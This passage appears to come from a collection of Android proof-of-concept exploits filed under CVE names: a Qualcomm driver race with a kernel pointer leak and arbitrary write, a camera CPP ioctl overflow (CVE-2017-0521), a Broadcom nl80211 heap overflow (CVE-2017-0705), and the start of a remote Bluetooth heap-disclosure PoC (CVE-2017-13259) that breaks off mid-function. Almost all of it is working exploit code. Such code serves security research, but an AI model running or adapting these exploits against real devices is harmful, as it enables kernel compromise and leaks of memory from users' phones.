		recvmsg(fd, &msg, MSG_CMSG_CLOEXEC);
		memset(io.iov_base, 0, 128);
		printf("node_id %u and port_id %u\n",
		       addr.address.addr.port_addr.node_id,
		       addr.address.addr.port_addr.port_id);
		hdr = io.iov_base;

		hdr->cntl_flag = QMI_RESPONSE_CONTROL_FLAG;
		hdr->txn_id = count++;
		hdr->msg_id = SNS_QFP_OPEN_RESP_V01;
		hdr->msg_len = 3;
		//io.iov_len = sizeof(hdr);

		ptr = io.iov_base + sizeof(*hdr);

		*ptr = OPTIONAL_TLV_TYPE_START;
		ptr++;
		*ptr = 0;
		ptr++;
		*ptr = 0;
		//address.addrtype = MSM_IPC_ADDR_ID;
		sendmsg(fd, &msg, MSG_CMSG_CLOEXEC);
		//printf("msg %s\n", strerror(errno));
		//print_msg(io.iov_base);
	}

}

#define BUILD_INSTANCE_ID(vers, ins) (((vers) & 0xFF) | (((ins) & 0xFF) << 8))
static void setup_ipc_server(void)
{
	int fd;
	struct sockaddr_msm_ipc addr = { 0 };
	fd = socket(AF_MSM_IPC, SOCK_DGRAM, 0);

	if (fd < 0) {
		printf("Couldn't open socket %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}

	addr.family = AF_MSM_IPC;
	addr.address.addrtype = MSM_IPC_ADDR_NAME;
	addr.address.addr.port_name.service = QBT1000_SNS_SERVICE_ID;
	addr.address.addr.port_name.instance =
		BUILD_INSTANCE_ID(QBT1000_SNS_SERVICE_VER_ID, QBT1000_SNS_INSTANCE_INST_ID);

	bind(fd, (struct sockaddr *) &addr, sizeof(addr));
	recv_msgs(fd);
	printf("bind with strerror %s\n", strerror(errno));
}

static void *leak_ptr(void *ignore)
{
	void *save;
	while(cont) {
		if (app.app_handle != NULL) {
			save = *app.app_handle;
			if (save != NULL) {
				printf("Leaked ptr is %p\n", save);
				break;
			}
		}
	}

}

static void *do_ipc_crap(void *ignore)
{
	setup_ipc_server();
}

int main(void)
{
	int fd;
	pthread_t race_car;
	pthread_t race_car1;
	pthread_create(&race_car, NULL, do_ipc_crap, NULL);
	usleep(50000);
	fd = get_fd(dev);
	pthread_create(&race_car1, NULL, leak_ptr, NULL);
	usleep(1000);
	leak_heap_ptr(fd);
	/* Comment out below as necessary */
	//arb_kernel_write_load_app(fd);
	arb_kernel_write_send_tzcmd(fd);


}

```

`CVE-2017-0521.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/videodev2.h>
#include <sys/mman.h>
#include <linux/ion.h>  
#include <linux/types.h>

/* Should be same as VIDEO_MAX_PLANES in videodev2.h */
#define MAX_PLANES VIDEO_MAX_PLANES
/* PARTIAL_FRAME_STRIPE_COUNT must be even */
#define PARTIAL_FRAME_STRIPE_COUNT 4

#define MAX_NUM_CPP_STRIPS 8
#define MSM_CPP_MAX_NUM_PLANES 3
#define MSM_CPP_MIN_FRAME_LENGTH 13
#define MSM_CPP_MAX_FRAME_LENGTH 4096
#define MSM_CPP_MAX_FW_NAME_LEN 32
#define MAX_FREQ_TBL 10

enum msm_cpp_frame_type {
	MSM_CPP_OFFLINE_FRAME,
	MSM_CPP_REALTIME_FRAME,
};

enum msm_vpe_frame_type {
	MSM_VPE_OFFLINE_FRAME,
	MSM_VPE_REALTIME_FRAME,
};

struct msm_cpp_buffer_info_t {
	int32_t fd;
	uint32_t index;
	uint32_t offset;
	uint8_t native_buff;
	uint8_t processed_divert;
	uint32_t identity;
};

struct msm_cpp_stream_buff_info_t {
	uint32_t identity;
	uint32_t num_buffs;
	struct msm_cpp_buffer_info_t *buffer_info;
};

enum msm_cpp_batch_mode_t {
	BATCH_MODE_NONE,
	BATCH_MODE_VIDEO,
	BATCH_MODE_PREVIEW
};

struct msm_cpp_batch_info_t {
	enum msm_cpp_batch_mode_t  batch_mode;
	uint32_t batch_size;
	uint32_t intra_plane_offset[MAX_PLANES];
	uint32_t pick_preview_idx;
	uint32_t cont_idx;
};

struct msm_cpp_frame_info_t {
	int32_t frame_id;
	struct timeval timestamp;
	uint32_t inst_id;
	uint32_t identity;
	uint32_t client_id;
	enum msm_cpp_frame_type frame_type;
	uint32_t num_strips;
	uint32_t msg_len;
	uint32_t *cpp_cmd_msg;
	int src_fd;
	int dst_fd;
	struct timeval in_time, out_time;
	void __user *cookie;
	int32_t *status;
	int32_t duplicate_output;
	uint32_t duplicate_identity;
	uint32_t feature_mask;
	uint8_t we_disable;
	struct msm_cpp_buffer_info_t input_buffer_info;
	struct msm_cpp_buffer_info_t output_buffer_info[8];
	struct msm_cpp_buffer_info_t duplicate_buffer_info;
	struct msm_cpp_buffer_info_t tnr_scratch_buffer_info[2];
	uint32_t reserved;
	uint8_t partial_frame_indicator;
	/* the followings are used only for partial_frame type
	 * and is only used for offline frame processing and
	 * only if payload big enough and need to be split into partial_frame
	 * if first_payload, kernel acquires output buffer
	 * first payload must have the last stripe
	 * buffer addresses from 0 to last_stripe_index are updated.
	 * kernel updates payload with msg_len and stripe_info
	 * kernel sends top level, plane level, then only stripes
	 * starting with first_stripe_index and
	 * ends with last_stripe_index
	 * kernel then sends trailing flag at frame done,
	 * if last payload, kernel queues the output buffer to HAL
	 */
	uint8_t first_payload;
	uint8_t last_payload;
	uint32_t first_stripe_index;
	uint32_t last_stripe_index;
	uint32_t stripe_info_offset;
	uint32_t stripe_info;
	struct msm_cpp_batch_info_t  batch_info;
};

struct msm_cpp_pop_stream_info_t {
	int32_t frame_id;
	uint32_t identity;
};

struct cpp_hw_info {
	uint32_t cpp_hw_version;
	uint32_t cpp_hw_caps;
	unsigned long freq_tbl[MAX_FREQ_TBL];
	uint32_t freq_tbl_count;
};

struct msm_vpe_frame_strip_info {
	uint32_t src_w;
	uint32_t src_h;
	uint32_t dst_w;
	uint32_t dst_h;
	uint32_t src_x;
	uint32_t src_y;
	uint32_t phase_step_x;
	uint32_t phase_step_y;
	uint32_t phase_init_x;
	uint32_t phase_init_y;
};

struct msm_vpe_buffer_info_t {
	int32_t fd;
	uint32_t index;
	uint32_t offset;
	uint8_t native_buff;
	uint8_t processed_divert;
};

struct msm_vpe_stream_buff_info_t {
	uint32_t identity;
	uint32_t num_buffs;
	struct msm_vpe_buffer_info_t *buffer_info;
};

struct msm_vpe_frame_info_t {
	int32_t frame_id;
	struct timeval timestamp;
	uint32_t inst_id;
	uint32_t identity;
	uint32_t client_id;
	enum msm_vpe_frame_type frame_type;
	struct msm_vpe_frame_strip_info strip_info;
	unsigned long src_fd;
	unsigned long dst_fd;
	struct ion_handle *src_ion_handle;
	struct ion_handle *dest_ion_handle;
	unsigned long src_phyaddr;
	unsigned long dest_phyaddr;
	unsigned long src_chroma_plane_offset;
	unsigned long dest_chroma_plane_offset;
	struct timeval in_time, out_time;
	void *cookie;

	struct msm_vpe_buffer_info_t input_buffer_info;
	struct msm_vpe_buffer_info_t output_buffer_info;
};


enum msm_camera_buf_mngr_buf_type {
	MSM_CAMERA_BUF_MNGR_BUF_PLANAR,
	MSM_CAMERA_BUF_MNGR_BUF_USER,
	MSM_CAMERA_BUF_MNGR_BUF_INVALID,
};

#define MSM_CAMERA_MAX_USER_BUFF_CNT 16
struct msm_camera_user_buf_cont_t {
	unsigned int buf_cnt;
	unsigned int buf_idx[MSM_CAMERA_MAX_USER_BUFF_CNT];
};

struct msm_buf_mngr_info {
	uint32_t session_id;
	uint32_t stream_id;
	uint32_t frame_id;
	struct timeval timestamp;
	uint32_t index;
	uint32_t reserved;
	enum msm_camera_buf_mngr_buf_type type;
	struct msm_camera_user_buf_cont_t user_buf;
};


struct msm_pproc_queue_buf_info {
	struct msm_buf_mngr_info buff_mgr_info;
	uint8_t is_buf_dirty;
};

struct msm_cpp_clock_settings_t {
	unsigned long clock_rate;
	uint64_t avg;
	uint64_t inst;
};

#define VIDIOC_MSM_CPP_CFG \
	_IOWR('V', BASE_VIDIOC_PRIVATE, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_GET_EVENTPAYLOAD \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 1, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_GET_INST_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 2, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_LOAD_FIRMWARE \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 3, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_GET_HW_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 4, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_FLUSH_QUEUE \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 5, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_ENQUEUE_STREAM_BUFF_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 6, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_DEQUEUE_STREAM_BUFF_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 7, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_CFG \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 8, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_TRANSACTION_SETUP \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 9, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_GET_EVENTPAYLOAD \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 10, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_GET_INST_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 11, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_ENQUEUE_STREAM_BUFF_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 12, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_VPE_DEQUEUE_STREAM_BUFF_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 13, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_QUEUE_BUF \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 14, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_APPEND_STREAM_BUFF_INFO \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 15, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_SET_CLOCK \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 16, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_POP_STREAM_BUFFER \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 17, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_IOMMU_ATTACH \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 18, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_IOMMU_DETACH \
	_IOWR('V', BASE_VIDIOC_PRIVATE + 19, struct msm_camera_v4l2_ioctl_t)

#define VIDIOC_MSM_CPP_DELETE_STREAM_BUFF\
	_IOWR('V', BASE_VIDIOC_PRIVATE + 20, struct msm_camera_v4l2_ioctl_t)


#define BASE_VIDIOC_PRIVATE     192             /* 192-255 are private */

#define V4L2_EVENT_CPP_FRAME_DONE  (V4L2_EVENT_PRIVATE_START + 0)
#define V4L2_EVENT_VPE_FRAME_DONE  (V4L2_EVENT_PRIVATE_START + 1)

struct msm_camera_v4l2_ioctl_t {
	uint32_t id;
	size_t len;
	int32_t trans_code;
	void __user *ioctl_ptr;
};

#define MSM_CPP_MSG_ID_TRAILER      0xABCDEFAA

int ion_open()
{
    int fd = open("/dev/ion", O_RDONLY);
    return fd;
}

static int ion_ioctl(int fd, int req, void *arg)
{
    int ret = ioctl(fd, req, arg);
    return ret;
}

int ion_alloc(int fd, size_t len, size_t align, unsigned int heap_mask,
              unsigned int flags, ion_user_handle_t *handle)
{
    int ret;
    struct ion_allocation_data data = {
        .len = len,
        .align = align,
        .heap_id_mask = heap_mask,
        .flags = flags,
	//.handle = handle,
    };
    if (handle == NULL)
        return -EINVAL;
printf("check 1\n");
    ret = ion_ioctl(fd, ION_IOC_ALLOC, &data);
    if (ret < 0)
        return ret;
printf("check 2\n");
    *handle = data.handle;
    
    return ret;
}


static void ion_get_fd(int fd, ion_user_handle_t *handle, int *buf_fd)
{

	union {
		struct ion_fd_data fd;
		struct ion_allocation_data allocation;
		struct ion_handle_data handle;
		struct ion_custom_data custom;
	} data;
	memset(&data, 0, sizeof(data));
	data.handle.handle = *handle;
	int ret = ioctl(fd, ION_IOC_SHARE, &data);
	printf("ret is %d with strerror %s\n", ret, strerror(errno));
	*buf_fd = data.fd.fd;
	printf("buf_fd = %d\n", *buf_fd);
}

int main(int argc, char **argv)
{
	int fd;
	int ion_fd;
	int buf_fd = -1;
	int ret;
	const size_t frame_size = 446;
	ion_user_handle_t ion_handle;
	uint32_t buf[frame_size];
	struct msm_camera_v4l2_ioctl_t request = { 0 };
	struct msm_cpp_frame_info_t frame_info;
	struct msm_cpp_buffer_info_t buff_info;
	struct msm_cpp_stream_buff_info_t stream_buff_info;

	memset(&buf, 0x00, sizeof(buf));
	memset(&frame_info, 0x01, sizeof(frame_info));
	memset(&buff_info, 0x00, sizeof(buff_info));
	memset(&stream_buff_info, 0x00, sizeof(stream_buff_info));

	ion_fd = ion_open();
	if(ion_fd < 0) {
		printf("Failed to open ion dev, reason: %s\n", strerror(errno));
		exit(-1);
	}

	ret = ion_alloc(ion_fd, 0x1000, 0, 0xfffffff,  
			ION_FLAG_CACHED | ION_FLAG_CACHED_NEEDS_SYNC,  
			&ion_handle);

	if(ret) {
		printf("ion_alloc failed, reason: %s\n", strerror(errno));
		exit(-1);
	}

	ion_get_fd(ion_fd, &ion_handle, &buf_fd);

/*
	int32_t fd;
	uint32_t index;
	uint32_t offset;
	uint8_t native_buff;
	uint8_t processed_divert;
	uint32_t identity;
*/

	//buff_info.

	//fd = open("/dev/v4l-subdev12", O_RDWR);
	char devs[256] = { 0 };
	//int i;
	//	for (i = 0; i < 10; i++) {
		//		v4l-subdev0
	sprintf(devs, "/dev/v4l-subdev%d", atoi(argv[1]));
	fd = open(devs, O_RDWR);

	if (fd < 0) {
		printf("Couldn't open %s, reason: %s\n", devs, strerror(errno));
		exit(1);
	}
	
	request.len = sizeof(stream_buff_info);
	request.ioctl_ptr = &stream_buff_info;
	stream_buff_info.num_buffs = 1;
	stream_buff_info.identity = 0x27BC86AA;//6666666666
	stream_buff_info.buffer_info = &buff_info;
	frame_info.identity = stream_buff_info.identity;
	buff_info.fd = buf_fd;
	buff_info.identity = 0x27BC86AA;//66666666660x1234CDEF;
	buff_info.index = 0;
	buff_info.native_buff = 1;

	ret = ioctl(fd, VIDIOC_MSM_CPP_ENQUEUE_STREAM_BUFF_INFO, &request);
	printf("ret done with %d\n", ret);

	ret = ioctl(fd, VIDIOC_MSM_CPP_IOMMU_ATTACH, &request);
	printf("ret done with %d\n", ret);
	
	buf[frame_size - 1] = MSM_CPP_MSG_ID_TRAILER;	
	frame_info.msg_len = frame_size;
	frame_info.cpp_cmd_msg = buf;
	frame_info.num_strips = UINT_MAX;
	frame_info.we_disable = 1;
	frame_info.duplicate_output = 0;
	frame_info.feature_mask = 0;
	frame_info.input_buffer_info = buff_info;

	request.len = sizeof(frame_info);
	request.ioctl_ptr = &frame_info;
	ret = ioctl(fd, VIDIOC_MSM_CPP_CFG, &request);
	//	}	
	close(fd);
}


```

`CVE-2017-0705.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>



#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <linux/nl80211.h>

#define OUI_GOOGLE  0x001A11
#define ANDROID_NL80211_SUBCMD_RTT_RANGE_START 0x1100
#define F1_32 0x41414141
#define WL_CHANSPEC_BW_80               0x2000


enum wl_vendor_subcmd {
	BRCM_VENDOR_SCMD_UNSPEC,
	BRCM_VENDOR_SCMD_PRIV_STR,
	GSCAN_SUBCMD_GET_CAPABILITIES = 0x1000,
	GSCAN_SUBCMD_SET_CONFIG,
	GSCAN_SUBCMD_SET_SCAN_CONFIG,
	GSCAN_SUBCMD_ENABLE_GSCAN,
	GSCAN_SUBCMD_GET_SCAN_RESULTS,
	GSCAN_SUBCMD_SCAN_RESULTS,
	GSCAN_SUBCMD_SET_HOTLIST,
	GSCAN_SUBCMD_SET_SIGNIFICANT_CHANGE_CONFIG,
	GSCAN_SUBCMD_ENABLE_FULL_SCAN_RESULTS,
	GSCAN_SUBCMD_GET_CHANNEL_LIST,
	ANDR_WIFI_SUBCMD_GET_FEATURE_SET,
	ANDR_WIFI_SUBCMD_GET_FEATURE_SET_MATRIX,
	ANDR_WIFI_RANDOM_MAC_OUI,
	ANDR_WIFI_NODFS_CHANNELS,
	ANDR_WIFI_SET_COUNTRY,
	GSCAN_SUBCMD_SET_EPNO_SSID,
	WIFI_SUBCMD_SET_SSID_WHITELIST,
	WIFI_SUBCMD_SET_LAZY_ROAM_PARAMS,
	WIFI_SUBCMD_ENABLE_LAZY_ROAM,
	WIFI_SUBCMD_SET_BSSID_PREF,
	WIFI_SUBCMD_SET_BSSID_BLACKLIST,
	GSCAN_SUBCMD_ANQPO_CONFIG,
	WIFI_SUBCMD_SET_RSSI_MONITOR,
	RTT_SUBCMD_SET_CONFIG = 0x1100,
	RTT_SUBCMD_CANCEL_CONFIG,
	RTT_SUBCMD_GETCAPABILITY,
	LSTATS_SUBCMD_GET_INFO = 0x1200,
	DEBUG_START_LOGGING = 0x1400,
	DEBUG_TRIGGER_MEM_DUMP,
	DEBUG_GET_MEM_DUMP,
	DEBUG_GET_VER,
	DEBUG_GET_RING_STATUS,
	DEBUG_GET_RING_DATA,
	DEBUG_GET_FEATURE,
	DEBUG_RESET_LOGGING,
	WIFI_OFFLOAD_SUBCMD_START_MKEEP_ALIVE = 0x1600,
	WIFI_OFFLOAD_SUBCMD_STOP_MKEEP_ALIVE,
	/* Add more sub commands here */
	    VENDOR_SUBCMD_MAX
};

enum debug_attributes {
	DEBUG_ATTRIBUTE_GET_DRIVER,
	DEBUG_ATTRIBUTE_GET_FW,
	DEBUG_ATTRIBUTE_RING_ID,
	DEBUG_ATTRIBUTE_RING_NAME,
	DEBUG_ATTRIBUTE_RING_FLAGS,
	DEBUG_ATTRIBUTE_LOG_LEVEL,
	DEBUG_ATTRIBUTE_LOG_TIME_INTVAL,
	DEBUG_ATTRIBUTE_LOG_MIN_DATA_SIZE,
	DEBUG_ATTRIBUTE_FW_DUMP_LEN,
	DEBUG_ATTRIBUTE_FW_DUMP_DATA,
	DEBUG_ATTRIBUTE_RING_DATA,
	DEBUG_ATTRIBUTE_RING_STATUS,
	        DEBUG_ATTRIBUTE_RING_NUM
};


enum gscan_attributes {
	GSCAN_ATTRIBUTE_NUM_BUCKETS = 10,
	GSCAN_ATTRIBUTE_BASE_PERIOD,
	GSCAN_ATTRIBUTE_BUCKETS_BAND,
	GSCAN_ATTRIBUTE_BUCKET_ID,
	GSCAN_ATTRIBUTE_BUCKET_PERIOD,
	GSCAN_ATTRIBUTE_BUCKET_NUM_CHANNELS,
	GSCAN_ATTRIBUTE_BUCKET_CHANNELS,
	GSCAN_ATTRIBUTE_NUM_AP_PER_SCAN,
	GSCAN_ATTRIBUTE_REPORT_THRESHOLD,
	GSCAN_ATTRIBUTE_NUM_SCANS_TO_CACHE,
	GSCAN_ATTRIBUTE_BAND = GSCAN_ATTRIBUTE_BUCKETS_BAND,

	GSCAN_ATTRIBUTE_ENABLE_FEATURE = 20,
	GSCAN_ATTRIBUTE_SCAN_RESULTS_COMPLETE,
	GSCAN_ATTRIBUTE_FLUSH_FEATURE,
	GSCAN_ATTRIBUTE_ENABLE_FULL_SCAN_RESULTS,
	GSCAN_ATTRIBUTE_REPORT_EVENTS,
	/* remaining reserved for additional attributes */
	GSCAN_ATTRIBUTE_NUM_OF_RESULTS = 30,
	GSCAN_ATTRIBUTE_FLUSH_RESULTS,
	GSCAN_ATTRIBUTE_SCAN_RESULTS,                       /* flat array of wifi_scan_result */
	GSCAN_ATTRIBUTE_SCAN_ID,                            /* indicates scan number */
	GSCAN_ATTRIBUTE_SCAN_FLAGS,                         /* indicates if scan was aborted */
	GSCAN_ATTRIBUTE_AP_FLAGS,                           /* flags on significant change event */
	GSCAN_ATTRIBUTE_NUM_CHANNELS,
	GSCAN_ATTRIBUTE_CHANNEL_LIST,

	/* remaining reserved for additional attributes */

	GSCAN_ATTRIBUTE_SSID = 40,
	GSCAN_ATTRIBUTE_BSSID,
	GSCAN_ATTRIBUTE_CHANNEL,
	GSCAN_ATTRIBUTE_RSSI,
	GSCAN_ATTRIBUTE_TIMESTAMP,
	GSCAN_ATTRIBUTE_RTT,
	GSCAN_ATTRIBUTE_RTTSD,

	/* remaining reserved for additional attributes */

	GSCAN_ATTRIBUTE_HOTLIST_BSSIDS = 50,
	GSCAN_ATTRIBUTE_RSSI_LOW,
	GSCAN_ATTRIBUTE_RSSI_HIGH,
	GSCAN_ATTRIBUTE_HOSTLIST_BSSID_ELEM,
	GSCAN_ATTRIBUTE_HOTLIST_FLUSH,

	/* remaining reserved for additional attributes */
	GSCAN_ATTRIBUTE_RSSI_SAMPLE_SIZE = 60,
	GSCAN_ATTRIBUTE_LOST_AP_SAMPLE_SIZE,
	GSCAN_ATTRIBUTE_MIN_BREACHING,
	GSCAN_ATTRIBUTE_SIGNIFICANT_CHANGE_BSSIDS,
	GSCAN_ATTRIBUTE_SIGNIFICANT_CHANGE_FLUSH,

	/* EPNO */
	GSCAN_ATTRIBUTE_EPNO_SSID_LIST = 70,
	GSCAN_ATTRIBUTE_EPNO_SSID,
	GSCAN_ATTRIBUTE_EPNO_SSID_LEN,
	GSCAN_ATTRIBUTE_EPNO_RSSI,
	GSCAN_ATTRIBUTE_EPNO_FLAGS,
	GSCAN_ATTRIBUTE_EPNO_AUTH,
	GSCAN_ATTRIBUTE_EPNO_SSID_NUM,
	GSCAN_ATTRIBUTE_EPNO_FLUSH,

	/* Roam SSID Whitelist and BSSID pref */
	GSCAN_ATTRIBUTE_WHITELIST_SSID = 80,
	GSCAN_ATTRIBUTE_NUM_WL_SSID,
	GSCAN_ATTRIBUTE_WL_SSID_LEN,
	GSCAN_ATTRIBUTE_WL_SSID_FLUSH,
	GSCAN_ATTRIBUTE_WHITELIST_SSID_ELEM,
	GSCAN_ATTRIBUTE_NUM_BSSID,
	GSCAN_ATTRIBUTE_BSSID_PREF_LIST,
	GSCAN_ATTRIBUTE_BSSID_PREF_FLUSH,
	GSCAN_ATTRIBUTE_BSSID_PREF,
	GSCAN_ATTRIBUTE_RSSI_MODIFIER,


	/* Roam cfg */
	GSCAN_ATTRIBUTE_A_BAND_BOOST_THRESHOLD = 90,
	GSCAN_ATTRIBUTE_A_BAND_PENALTY_THRESHOLD,
	GSCAN_ATTRIBUTE_A_BAND_BOOST_FACTOR,
	GSCAN_ATTRIBUTE_A_BAND_PENALTY_FACTOR,
	GSCAN_ATTRIBUTE_A_BAND_MAX_BOOST,
	GSCAN_ATTRIBUTE_LAZY_ROAM_HYSTERESIS,
	GSCAN_ATTRIBUTE_ALERT_ROAM_RSSI_TRIGGER,
	GSCAN_ATTRIBUTE_LAZY_ROAM_ENABLE,

	/* BSSID blacklist */
	GSCAN_ATTRIBUTE_BSSID_BLACKLIST_FLUSH = 100,
	GSCAN_ATTRIBUTE_BLACKLIST_BSSID,

	GSCAN_ATTRIBUTE_ANQPO_HS_LIST = 110,
	GSCAN_ATTRIBUTE_ANQPO_HS_LIST_SIZE,
	GSCAN_ATTRIBUTE_ANQPO_HS_NETWORK_ID,
	GSCAN_ATTRIBUTE_ANQPO_HS_NAI_REALM,
	GSCAN_ATTRIBUTE_ANQPO_HS_ROAM_CONSORTIUM_ID,
	GSCAN_ATTRIBUTE_ANQPO_HS_PLMN,

	/* Adaptive scan attributes */
	GSCAN_ATTRIBUTE_BUCKET_STEP_COUNT = 120,
	GSCAN_ATTRIBUTE_BUCKET_MAX_PERIOD,

	    GSCAN_ATTRIBUTE_MAX
};


#define ETHER_ADDR_LEN 6
struct  __attribute__ ((packed)) _ether_addr {
	uint8_t octet[ETHER_ADDR_LEN];
};

static int l1;
static int l2;
static void lol_broadcom_pls(struct nl_sock *socket, int d_id, int if_index)
{
	struct nl_msg *msg;
	struct nl_cb *cb;
	struct nl_msg *vendor_cmd, *nested_msg;
	struct nlattr *nl_vendor_cmds, *nested, *nested2, *nested3;
	int err, i, j = 0, k = 0,  ret;
	struct _ether_addr mac;
	memset(&mac, 0x41, sizeof(mac));

	// Allocate the messages and callback handler.
	for (j = l1; j < 1024; j++) {
		for(k = l2; k < 128; k++) {
	msg = nlmsg_alloc_size(16384);
	if (!msg) {
		printf("ERROR: Failed to allocate netlink message for msg.\n");
		exit(EXIT_FAILURE);
	}
	
	genlmsg_put(msg, 0, 0, d_id, 0, 0, NL80211_CMD_VENDOR, 0);
	nla_put_u32(msg, NL80211_ATTR_IFINDEX, if_index);
	nla_put_u32(msg, NL80211_ATTR_WIPHY, 0);
	nla_put_u64(msg, NL80211_ATTR_WDEV, 1);
	nla_put_u32(msg, NL80211_ATTR_VENDOR_ID, OUI_GOOGLE);
	nla_put_u32(msg, NL80211_ATTR_VENDOR_SUBCMD, GSCAN_SUBCMD_SET_SIGNIFICANT_CHANGE_CONFIG);

	/* construct the vendor cmd */
	nl_vendor_cmds = nla_nest_start(msg, NL80211_ATTR_VENDOR_DATA);

	nested = nla_nest_start(msg, GSCAN_ATTRIBUTE_SIGNIFICANT_CHANGE_BSSIDS);
	printf(" j %d and k %d\n", j, k);
	for (i = 0; i < j; i++) {
		nested2 = nla_nest_start(msg, i);
		//nla_put(msg, GSCAN_ATTRIBUTE_BSSID, sizeof(mac), &mac);
		//nla_put_u8(msg, GSCAN_ATTRIBUTE_RSSI_LOW, 0x41);
		//nla_put_u8(msg, GSCAN_ATTRIBUTE_RSSI_HIGH, 0x41);
		nla_nest_end(msg, nested2);
		//printf("nested2 size is %d\n", nested2->nla_len);
	}
	for (i = 0; i < k; i++) {
		nested2 = nla_nest_start(msg, i);
		nla_put(msg, GSCAN_ATTRIBUTE_BSSID, sizeof(mac), &mac);
		nla_put_u8(msg, GSCAN_ATTRIBUTE_RSSI_LOW, 0x41);
		nla_put_u8(msg, GSCAN_ATTRIBUTE_RSSI_HIGH, 0x41);
		nla_nest_end(msg, nested2);
	}
	nla_nest_end(msg, nested);
	nla_nest_end(msg, nl_vendor_cmds);
	
	//nested->nla_len -= (nested2->nla_len * 8);
	//nl_vendor_cmds->nla_len -= (nested2->nla_len * 8);
	nl_send_auto_complete(socket, msg);
	nlmsg_free(msg);
	usleep(10000);

		}
	}
}





int main(int argc, char **argv)
{

	int if_index = if_nametoindex("wlan0"); // Use this wireless interface for scanning.
	l1 = atoi(argv[1]);
	l2 = atoi(argv[2]);
	printf("if_index = %d\n", if_index);
	// Open socket to kernel.
	struct nl_sock *socket = nl_socket_alloc();  // Allocate new netlink socket in memory.
	genl_connect(socket);  // Create file descriptor and bind socket.
	int driver_id = genl_ctrl_resolve(socket, "nl80211");  // Find the nl80211 driver ID.
	printf("driver_id is %d\n", driver_id);

	lol_broadcom_pls(socket, driver_id, if_index);

}

```

`CVE-2017-13259.c`:

```c
/** CVE-2017-13259 Remote BT heap disclosure
 ** PoC by Sbauer
 ** Found by Jianjun Dai, independently found by sbauer later.
 */
 

#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <pthread.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/sdp.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>


#define EIR_FLAGS                   0x01  /* flags */
#define EIR_NAME_COMPLETE           0x09  /* complete local name */
#define EIR_LIM_DISC                0x01 /* LE Limited Discoverable Mode */
#define EIR_GEN_DISC                0x02 /* LE General Discoverable Mode */
static int count = 0;

static int init_server(uint16_t mtu)
{
	struct l2cap_options opts;
	struct sockaddr_l2 l2addr;
	socklen_t optlen;
	int l2cap_sock;

	/* Create L2CAP socket */
	l2cap_sock = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
	if (l2cap_sock < 0) {
		printf("opening L2CAP socket: %s", strerror(errno));
		return -1;
	}

	memset(&l2addr, 0, sizeof(l2addr));
	l2addr.l2_family = AF_BLUETOOTH;
	bacpy(&l2addr.l2_bdaddr, BDADDR_ANY);
	l2addr.l2_psm = htobs(SDP_PSM);

	if (bind(l2cap_sock, (struct sockaddr *) &l2addr, sizeof(l2addr)) < 0) {
		printf("binding L2CAP socket: %s", strerror(errno));
		return -1;
	}

	int opt = L2CAP_LM_MASTER;
	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_LM, &opt, sizeof(opt)) < 0) {
		printf("setsockopt: %s", strerror(errno));
		return -1;
	}

	memset(&opts, 0, sizeof(opts));
	optlen = sizeof(opts);

	if (getsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, &optlen) < 0) {
		printf("getsockopt: %s", strerror(errno));
		return -1;
	}
	opts.omtu = mtu;
	opts.imtu = mtu;

	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts)) < 0) {
		printf("setsockopt: %s", strerror(errno));
		return -1;
	}

	if (listen(l2cap_sock, 5) < 0) {
